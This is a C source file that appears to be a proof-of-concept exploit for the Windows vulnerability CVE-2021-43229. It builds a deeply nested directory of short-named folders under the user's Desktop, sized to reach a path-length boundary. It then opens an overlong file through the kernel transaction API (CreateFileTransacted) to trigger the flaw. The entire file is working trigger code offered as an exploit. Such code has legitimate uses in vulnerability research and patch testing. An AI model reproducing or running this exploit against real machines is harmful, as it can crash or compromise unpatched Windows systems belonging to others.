#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "cve-2021-43229.h"
#include "utils.h"

#include "toolbox/common.h"
#include "toolbox/log.h"

#include <ktmw32.h>
#pragma comment(lib, "KtmW32.lib")

int32_t CreateVulnerableDirectory(
  char*     RootPath,
  uint32_t  RootPathLength,
  char**    VulnerablePath,
  uint32_t* VulnerablePathLength)
{
  char*    WorkingPath       = NULL;
  int32_t  ExitCode          = EXIT_FAILURE;
  uint32_t RemainingLength   = 0;
  uint32_t WorkingPathLength = 0;
  void*    Tmp               = NULL;

  if (!IS_VALID_POINTER(RootPath))
  {
    LOG_ERROR("Invalid root path");
    goto EXIT;
  }

  if (IS_ZERO(RootPathLength))
  {
    LOG_ERROR("Invalid root path length");
    goto EXIT;
  }

  if (!IS_VALID_POINTER(VulnerablePath))
  {
    LOG_ERROR("Invalid vulnerable path");
    goto EXIT;
  }

  if (!IS_VALID_POINTER(VulnerablePathLength))
  {
    LOG_ERROR("Invalid vulnerable path length");
    goto EXIT;
  }

  WorkingPath = malloc(RootPathLength + sizeof(char));
  if (!IS_VALID_POINTER(WorkingPath))
  {
    LOG_ERROR("malloc");
    goto EXIT;
  }
  memmove(WorkingPath, RootPath, RootPathLength + sizeof(char));
  WorkingPathLength = RootPathLength;

  RemainingLength = SEGMENT_SIZE / 2;
  RemainingLength += sizeof(DOS_PATH_PREFIX);
  RemainingLength -= RootPathLength;

  for (uint32_t SubDirCount = RemainingLength / _MAX_DIR;
       !IS_ZERO(SubDirCount);
       --SubDirCount)
  {
    Tmp = realloc(WorkingPath, WorkingPathLength + _MAX_PATH);
    if (!IS_VALID_POINTER(Tmp))
    {
      LOG_ERROR("realloc");
      goto EXIT;
    }
    WorkingPath                               = Tmp;
    WorkingPath[WorkingPathLength + _MAX_DIR] = 0;

    memset(WorkingPath + WorkingPathLength, CURRENT_CHARACTER, _MAX_DIR);
    WorkingPath[WorkingPathLength] = '\\';

    if (IS_FALSE(CreateDirectory(WorkingPath, NULL)) &&
        GetLastError() != ERROR_ALREADY_EXISTS)
    {
      LOG_ERROR("CreateDirectory");
      goto EXIT;
    }

    WorkingPath[WorkingPathLength] = '\\';
    memmove(WorkingPath + WorkingPathLength + sizeof(char),
            CURRENT_SHORT_NAME,
            CURRENT_SHORT_NAME_SIZE);

    WorkingPathLength += CURRENT_SHORT_NAME_SIZE + sizeof(char);
  }

  Tmp = realloc(WorkingPath, WorkingPathLength + _MAX_PATH);
  if (!IS_VALID_POINTER(Tmp))
  {
    LOG_ERROR("realloc");
    goto EXIT;
  }
  WorkingPath = Tmp;

  RemainingLength %= _MAX_DIR;

  memset(WorkingPath + WorkingPathLength, CURRENT_CHARACTER, RemainingLength);
  WorkingPath[WorkingPathLength] = '\\';
  WorkingPathLength += RemainingLength;
  WorkingPath[WorkingPathLength] = 0;

  if (IS_FALSE(CreateDirectory(WorkingPath, NULL)) &&
      GetLastError() != ERROR_ALREADY_EXISTS)
  {
    LOG_ERROR("CreateDirectory");
    goto EXIT;
  }

  *VulnerablePath       = WorkingPath;
  *VulnerablePathLength = WorkingPathLength;
  WorkingPath           = NULL;

  LOG_DEBUG("Vulnerable path [%u|0x%04x]: %s",
            *VulnerablePathLength,
            *VulnerablePathLength,
            *VulnerablePath);

  ExitCode = EXIT_SUCCESS;

EXIT:
  free(WorkingPath);

  return ExitCode;
}

int32_t Poc()
{
  char*    DosDesktopPath       = NULL;
  char*    ShortPath            = NULL;
  char*    VulnerableFilePath   = NULL;
  HANDLE   hFile                = INVALID_HANDLE_VALUE;
  HANDLE   hTransaction         = INVALID_HANDLE_VALUE;
  int32_t  ExitCode             = EXIT_FAILURE;
  uint32_t DosDesktopPathLength = 0;
  uint32_t ShortPathLength      = 0;

  LOG_INFO("CVE-2021-43229 PoC");

  LOG_INFO("Trigger...");
  getchar();

  DosDesktopPath = GetDosDesktopPath(&DosDesktopPathLength);
  if (!IS_VALID_POINTER(DosDesktopPath))
  {
    LOG_WARN("failed");
    goto EXIT;
  }

  if (EXIT_FAILED(CreateVulnerableDirectory(DosDesktopPath,
                                            DosDesktopPathLength,
                                            &ShortPath,
                                            &ShortPathLength)))
  {
    LOG_WARN("failed");
    goto EXIT;
  }

  VulnerableFilePath = malloc(ShortPathLength + _MAX_FNAME + sizeof(char));
  if (!IS_VALID_POINTER(VulnerableFilePath))
  {
    LOG_ERROR("malloc");
    goto EXIT;
  }

  memmove(VulnerableFilePath, ShortPath, ShortPathLength);
  memset(VulnerableFilePath + ShortPathLength, 'A', _MAX_FNAME);
  VulnerableFilePath[ShortPathLength]              = '\\';
  VulnerableFilePath[ShortPathLength + _MAX_FNAME] = 0;

  LOG_DEBUG("Vulnerable file path [%u|0x%04x]: %s",
            ShortPathLength + _MAX_FNAME,
            ShortPathLength + _MAX_FNAME,
            VulnerableFilePath);

  hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
  if (!IS_VALID_HANDLE(hTransaction))
  {
    LOG_ERROR("CreateTransaction");
    goto EXIT;
  }

  hFile = CreateFileTransacted(VulnerableFilePath,
                               GENERIC_WRITE,
                               0,
                               NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL,
                               hTransaction,
                               NULL,
                               NULL);
  if (!IS_VALID_HANDLE(hFile))
  {
    LOG_ERROR("CreateFileTransacted");
    goto EXIT;
  }

  ExitCode = EXIT_SUCCESS;

EXIT:
  CloseHandle(hFile);
  CloseHandle(hTransaction);
  free(VulnerableFilePath);
  free(ShortPath);
  free(DosDesktopPath);

  return ExitCode;
}
